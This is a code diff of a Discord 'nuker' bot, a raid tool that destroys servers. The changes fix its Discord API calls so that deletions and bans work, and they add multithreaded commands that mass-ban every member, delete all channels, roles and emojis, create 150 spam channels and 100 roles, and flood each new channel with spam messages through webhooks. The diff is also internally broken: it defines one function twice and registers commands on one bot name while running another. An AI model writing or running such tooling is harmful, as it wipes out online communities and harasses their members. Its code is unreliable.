@@ -30,7 +30,7 @@ async def on_ready():
 | |_| |/ _ \ | '_ ` _ \| | | | __|
 |  _  |  __/ | | | | | | |_| | |_
 |_| |_|\___|_|_| |_| |_|\__,_|\__|
-    Made by Black and Kosef
+          Made by Black
 
 
 ''')
@@ -50,33 +50,18 @@ async def help(ctx):
 ```{prefix}ccr <amount> - Create Channels```
 ```{prefix}rcr <amount> - Create Roles```
 ```{prefix}massban - Ban all members```
-```{prefix}rdel - Delete all Roles```
+```{prefix}rdel - Delete all Roles
+```{prefix}edel - Delete Emojis```
 """,
     )
     embed.set_image(url="https://tenor.com/view/soldier-gif-14847526")
     await ctx.send(embed=embed)
 
-@helmut.command()
-async def nuke(ctx):
-    await ctx.message.delete()
-    guild = ctx.guild
-    for channel in guild.channels:
-        try:
-            await channel.delete()
-            print(Fore.GREEN + f"{channel.name} was deleted" + Fore.RESET)
-        except:
-                print(Fore.MAGENTA + f"{channel.name} was not deleted" + Fore.RESET)
-                await guild.create_text_channel("lol")
-                for i in range(500):
-                    try:
-                        await guild.create_text_channel(random.choice(spam_channel))
-                    except:
-                            pass
-
 @helmut.event
 async def on_guild_channel_create(channel):
+    webhook = await channel.create_webhook(name="black")
     while True:
-        await channel.send(random.choice(spam_message))
+        await webhook.send(random.choice(spam_message))
 
 def channel_create(guild_id):
     payload = {
@@ -97,7 +82,7 @@ async def ccr(ctx, amount: int):
 
 def delete_channel(channel_id):
     try:
-        requests.post(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
+        requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
     except:
             pass
 
@@ -106,15 +91,6 @@ async def cdel(ctx):
     await ctx.message.delete()
     for channel in ctx.guild.channels:
         threading.Thread(target=delete_channel, args=(channel.id,)).start()
-
-@helmut.command()
-async def massban(ctx):
-    await ctx.message.delete()
-    for member in ctx.guild.members:
-        try:
-            await member.ban()
-        except:
-          pass
 
 def create_roles(guild_id):
     payload = {
@@ -134,7 +110,7 @@ async def rcr(ctx, amount: int):
         
 def role_delete(guild_id, role_id):
   try:
-    requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}", headers=headers)
+    requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}", headers=headers)
   except:
       pass
 
@@ -144,4 +120,50 @@ async def rdel(ctx):
   for role in ctx.guild.roles:
     threading.Thread(target=role_delete, args=(ctx.guild.id, role.id,)).start()
 
+def ban_member(guild_id, member_id):
+  try:
+    requests.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}", headers=headers)
+  except:
+      pass
+
+def emoji_delete(guild_id, emoji_id):
+    try:
+        requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/emojis/{emoji_id}", headers=headers)
+    except:
+            pass
+
+@black.command()
+async def edel(ctx):
+    await ctx.message.delete()
+    for emoji in ctx.guild.emojis:
+        threading.Thread(target=emoji_delete, args=(ctx.guild.id, emoji.id,)).start()
+
+def ban_member(guild_id, member_id):
+  try:
+    requests.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}", headers=headers)
+  except:
+      pass
+    
+@black.command()
+async def massban(ctx):
+  await ctx.message.delete()
+  for member in ctx.guild.members:
+    threading.Thread(target=ban_member, args=(ctx.guild.id, member.id,)).start()
+ 
+@black.command()
+async def nuke(ctx):
+    await ctx.message.delete()
+    for channel in ctx.guild.channels:
+        threading.Thread(target=delete_channel, args=(channel.id,)).start()
+
+    for i in range(150):
+        threading.Thread(target=channel_create, args=(ctx.guild.id,)).start()
+
+    for role in ctx.guild.roles:
+        threading.Thread(target=role_delete, args=(ctx.guild.id, role.id,)).start()
+
+    for i in range(100):
+        threading.Thread(target=create_roles, args=(ctx.guild.id,)).start()
+
+        
 helmut.run(token)
